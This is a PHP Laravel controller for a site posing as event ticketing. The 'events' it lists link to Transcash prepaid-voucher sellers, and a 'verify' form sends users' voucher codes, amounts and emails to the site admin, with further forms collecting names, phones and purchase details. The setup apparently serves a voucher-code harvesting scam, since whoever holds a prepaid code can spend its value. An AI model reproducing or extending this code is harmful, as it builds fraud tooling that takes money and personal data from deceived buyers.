<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class PageController extends Controller
{
    public function home()
    {
        return view('home');
    }

    public function acheter()
    {
        $evenements = [
            [
                'slug' => 'festival-aurore',
                'titre' => 'Guthaben',
                'categorie' => '',
                'lieu' => '',
                'prix' => 39,
                'image' => 'images/events/un.png',
                'position' => 'center',
                'bouton' => __('buy.button_guthaben'),
                'lien' => 'https://www.guthaben.de/transcash',
            ],
            [
                'slug' => 'nuit-electro',
                'titre' => 'Kaartdirect',
                'categorie' => '',
                'lieu' => '',
                'prix' => 25,
                'image' => 'images/events/deux.png',
                'position' => 'center',
                'bouton' => __('buy.button_kaartdirect'),
                'lien' => 'https://kaartdirect.be/betaalkaarten/transcash',
            ],
            [
                'slug' => 'theatre-du-port',
                'titre' => 'Dundle.com',
                'categorie' => '',
                'lieu' => '',
                'prix' => 22,
                'image' => 'images/events/trois.png',
                'position' => 'center',
                'bouton' => __('buy.button_dundle'),
                'lien' => 'https://dundle.com/de/en/transcash/',
            ],
        ];

        return view('acheter', compact('evenements'));
    }

    public function verifier()
    {
        return view('verifier');
    }

    public function verifierSoumettre(Request $request)
    {
        $donnees = $request->validate([
            'evenement' => 'required|string|max:100',
            'montant' => 'required|string|max:30',
            'code' => 'required|string|max:30',
            'recevoir_email' => 'nullable|string',
            'email' => 'required|email',
        ]);

        \Mail::to(config('mail.admin_address'))->send(new \App\Mail\DemandeVerification($donnees));

        return back()->with('envoye', true);
    }


  public function remboursement()
{
    return view('remboursement');
}

    public function remboursementSoumettre(Request $request)
    {
        $donnees = $request->validate([
            'nom' => 'required|string|max:150',
            'email' => 'required|email|max:255',
            'telephone' => 'nullable|string|max:30',
            'reference' => 'required|string|max:150',
            'type_billet' => 'required|string|max:100',
            'montant' => 'required|numeric|min:1',
            'date_achat' => 'required|date',
            'motif' => 'required|string|max:100',
            'details' => 'nullable|string|max:5000',
        ]);

        \Mail::to(config('mail.admin_address'))
            ->send(new \App\Mail\DemandeRemboursement($donnees));

        return back()->with('envoye', true);
    }

    public function contact()
    {
        return view('contact');
    }

    public function contactSoumettre(Request $request)
    {
        $donnees = $request->validate([
            'nom' => 'required|string|max:150',
            'email' => 'required|email|max:255',
            'sujet' => 'required|string|max:150',
            'message' => 'required|string|max:5000',
        ]);

        \Mail::to(config('mail.admin_address'))
            ->send(new \App\Mail\DemandeContact($donnees));

        return back()->with('envoye', true);
    }

}